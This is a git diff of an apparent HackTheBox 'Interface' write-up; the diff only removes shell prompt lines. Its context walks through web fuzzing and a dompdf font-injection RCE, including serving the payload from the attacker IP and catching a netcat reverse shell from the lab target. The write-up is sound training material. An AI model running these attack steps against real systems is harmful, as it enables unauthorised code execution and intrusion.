@@ -10,7 +10,6 @@ This is [Hackthebox](https://app.hackthebox.com/machines/527) medium Linux machi
 ## Enumeration
 ### Nmap Scan
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ nmap -sC -sV -oN nmap-scan  10.10.11.200 
 ```
 **Result**
@@ -55,7 +54,6 @@ The site returns that message meaning the file I was trying to access is not fou
 ### Enumerate Enumerate Enumerate 
 **Command**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 0   
 ```
 **Result**
@@ -88,7 +86,6 @@ vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2]
 ```
 There is `api` and `vendor` directory then i can try to access them.
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/
 HTTP/1.1 404 Not Found
 Server: nginx/1.14.0 (Ubuntu)
@@ -103,7 +100,6 @@ The same message continues, meaning more fuzzing is needed here but I can enumer
 
 **Command**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ ffuf -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 0
 ```
 **Result**
@@ -136,7 +132,6 @@ composer                [Status: 403, Size: 15, Words: 2, Lines: 2]
 ```
 The fuzzing provided two new directories which are `composer` and `dompdf` all these directories i can try to access them to see how they will respond as follows:-
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/composer
 HTTP/1.1 403 Forbidden
 Server: nginx/1.14.0 (Ubuntu)
@@ -149,7 +144,6 @@ Access denied.
 ```
 Composer returns status code `403` with `Access denied` message
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf  
 HTTP/1.1 403 Forbidden
 Server: nginx/1.14.0 (Ubuntu)
@@ -166,7 +160,6 @@ Searching with `searchsploit` resulted the followings.
 
 **Command**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ searchsploit dompdf 
 ```
 **Result**
@@ -184,7 +177,6 @@ All of these have no place or means to exploit to this web application, I will s
 
 **Request**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ curl -i http://prd.m.rendering-api.interface.htb/api           
 HTTP/1.1 404 Not Found
 Server: nginx/1.14.0 (Ubuntu)
@@ -199,7 +191,6 @@ The response is pretty clear with status code `404` with a message that `route n
 
 **Command**
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 50 -X POST
 ```
 **Result**
@@ -230,7 +221,6 @@ html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1]
 ```
 Tried to fuzz `api` with `GET` method but it end up with `502` code but after changing it to `POST` result was promising as shown above that there is another endpoint `html2pdf` which i can now access it
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ curl -i http://prd.m.rendering-api.interface.htb/api/html2pdf
 HTTP/1.1 404 Not Found
 Server: nginx/1.14.0 (Ubuntu)
@@ -243,7 +233,6 @@ Connection: keep-alive
 ```
 I used the `curl` command without specifying the requesting method which by default will be `GET` and it keep saying `route not defined` . So now i will change the method to `POST` and see the result if it is different.
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ curl -i http://prd.m.rendering-api.interface.htb/api/html2pdf -X POST
 HTTP/1.1 422 Unprocessable Entity
 Server: nginx/1.14.0 (Ubuntu)
@@ -257,7 +246,6 @@ Connection: keep-alive
 Result now is different and claims that some parameters are missed then now another enumeration is required to know which parameters are missed.
 ### More Enumeration
 ```
-┌──(gemstone㉿hashghost)-[~/…/interface/exploit/dompdf-rce/exploit]
 └─$ ffuf -u http://prd.m.rendering-api.interface.htb/api/html2pdf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 50,36  -d '{"FUZZ":"FUZZ"}' -H "Content-Type: application/json"
 ```
 **Result**
@@ -317,7 +305,6 @@ Change the `exploit_font.php` and the following line at the very bottom of the f
 
 Start `python` server to make sure that the file is being sent to the server and delivered successfully. 
 ```
-┌──(gemstone㉿hashghost)-[~/…/interface/exploit/dompdf-rce/exploit]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -331,7 +318,6 @@ Send the file with as parameter.
 
 Check for the response 
 ```
-┌──(gemstone㉿hashghost)-[~/…/interface/exploit/dompdf-rce/exploit]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.200 - - [31/Mar/2023 00:00:39] "GET /exploit.css HTTP/1.0" 200 -
@@ -345,7 +331,6 @@ According [positive.security](https://positive.security/blog/dompdf-rce) blog po
 
 Create `md5` hash of the file `exploit_font.php`
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ echo -n http://10.10.14.94/exploit_font.php | md5sum
 1a3cd1e49f9b715e8e533407fa8b1caa  -
 ```
@@ -354,7 +339,6 @@ Create `md5` hash of the file `exploit_font.php`
 
 Start a listener
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ nc -nlvp 1234
 ```
 
@@ -368,7 +352,6 @@ Send the request now
 
 Response in `netcat` listener 
 ```
-┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
 └─$ nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.94] from (UNKNOWN) [10.10.11.200] 33382
